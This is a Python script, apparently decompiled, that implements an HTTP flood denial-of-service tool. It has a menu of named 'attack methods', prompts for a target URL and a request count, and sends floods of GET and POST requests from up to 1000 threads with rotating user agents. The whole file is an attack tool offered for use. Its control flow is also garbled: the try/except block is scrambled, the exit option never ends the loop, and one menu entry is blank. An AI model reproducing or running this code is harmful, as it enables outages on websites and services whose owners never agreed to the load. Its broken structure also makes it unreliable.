# error benerin sendiri 
# decode by viewtech
import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor
RED = '[91m'
CYAN = '[96m'
RESET = '[0m'
USER_AGENTS = ['Mozilla/5.0 (X11; openSUSE Leap 15.3; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Safari/537.36', 'Mozilla/5.0 (X11; Debian 10; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/114.0.1823.82 Safari/537.36', 'Mozilla/5.0 (X11; CentOS 7; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/1.52.126 Safari/537.36', 'Mozilla/5.0 (X11; Debian 11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/114.0.1823.82 Safari/537.36', 'Mozilla/5.0 (X11; Fedora 36; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/1.52.126 Safari/537.36', 'Mozilla/5.0 (X11; Debian 11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/115.0 Safari/537.36', 'Mozilla/5.0 (X11; openSUSE Leap 15.4; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Vivaldi/5.6.2867.58 Safari/537.36', 'Mozilla/5.0 (X11; Debian 11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/1.52.126 Safari/537.36', 'Mozilla/5.0 (X11; openSUSE Leap 15.4; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Vivaldi/5.6.2867.58 Safari/537.36', 'Mozilla/5.0 (X11; Debian 10; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/115.0 Safari/537.36']

def send_request(target_url, method):
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    try:
        if method == 'https':
            response = requests.get(target_url, headers=headers, timeout=5)
        else:  
            if method == 'flood':
                response = requests.post(target_url, headers=headers, data={'flood': 'test'}, timeout=5)
            else:  
                if method == 'bypass':
                    response = requests.get(target_url + '/bypass', headers=headers, timeout=5)
                else:  
                    if method == 'uam':
                        response = requests.get(target_url + '/uam', headers=headers, timeout=5)
                    else:  
                        if method == 'tls':
                            response = requests.get(target_url, headers=headers, timeout=5, verify=False)
                        else:  
                            if method == 'r2':
                                response = requests.get(target_url + '/r2', headers=headers, timeout=5)
                            else:  
                                if method == 'gyat':
                                    response = requests.post(target_url, headers=headers, data={'gyat': 'attack'}, timeout=5)
        print(f'{CYAN}[{method.upper()}]{RESET} Sent to {target_url} -> {RED}Status: {response.status_code}{RESET}')
    except Exception as e:
        print(f'{RED}[ERROR]{RESET} {method.upper()} failed: {e}')

def run_attack(target_url, method, num_requests):
    print(f'{RED}⚠️ Running {method.upper()} attack on {target_url} ⚠️{RESET}')
    with ThreadPoolExecutor(max_workers=1000) as executor:
        for _ in range(num_requests):
            executor.submit(send_request, target_url, method)
    print(f'{CYAN}✅ Attack completed! ✅{RESET}')

def display_menu():
    print('\n'.join(f'{RED} Author: John Felix {RESET}\n{RED}🔥 Attack Methods 🔥{RESET}\n\n1. {CYAN}Flood{RESET}\n2. {CYAN}\n3. {CYAN}UAM{RESET}\n4. {CYAN}TLS{RESET}\n5. {CYAN}HTTPS{RESET}\n6. {CYAN}R2{RESET}\n7. {CYAN}Gyat{RESET}\n'))
if __name__ == '__main__':
    while True:
        display_menu()
        choice = input(f'{CYAN}Choose a method (1-7 or \'exit\'): {RESET}').strip()
        if choice.lower() == 'exit':
            print(f'{RED}Exiting... Goodbye!{RESET}')
        methods = {'1': 'flood', '2': 'bypass', '3': 'uam', '4': 'tls', '5': 'https', '6': 'r2', '7': 'gyat'}
        method = methods.get(choice)
        if not method:
            print(f'{RED}Invalid choice, please try again.{RESET}')
            continue
        target_url = input(f'{CYAN}Enter target URL: {RESET}').strip()
        try:
            num_requests = int(input(f'{CYAN}Enter number of requests: {RESET}'))
    except ValueError:
        else:  
            run_attack(target_url, method, num_requests)
        print(f'{RED}Invalid number of requests. Please enter a valid integer.{RESET}')
        pass
